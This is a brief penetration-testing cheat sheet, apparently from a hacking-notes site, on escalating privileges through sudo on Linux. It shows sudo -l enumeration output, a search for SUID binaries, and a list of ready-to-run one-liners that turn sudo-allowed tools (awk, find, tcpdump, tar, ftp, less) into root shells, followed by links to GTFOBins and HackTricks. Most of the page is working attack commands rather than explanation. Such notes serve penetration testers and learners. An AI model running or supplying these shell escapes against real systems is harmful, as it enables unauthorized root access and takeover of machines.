# Sudo Trickery

## Enumerating Sudo Permissions

### Checking Sudo-Related Permissions

```shell-session
$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

### Find all SUID Binaries

```shell-session
$ find / -perm -4000 2>/dev/null #Find all SUID binaries
```

### Sneaking Commands at the end of a command

Sometimes we can slide in a shell command at the end of a command

```shell-session
$ sudo awk 'BEGIN {system("/bin/sh")}'
$ sudo find /etc -exec sh -i \;
$ sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
$ sudo tar c a.tar -I ./runme.sh a
$ ftp>!/bin/sh
$ less>! <shell_comand>
```

### GTFOBins

Check GTFOBins - a list of binaries that can be exploited to bypass local restrictions.

{% embed url="https://gtfobins.github.io/" %}

***

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid" %}
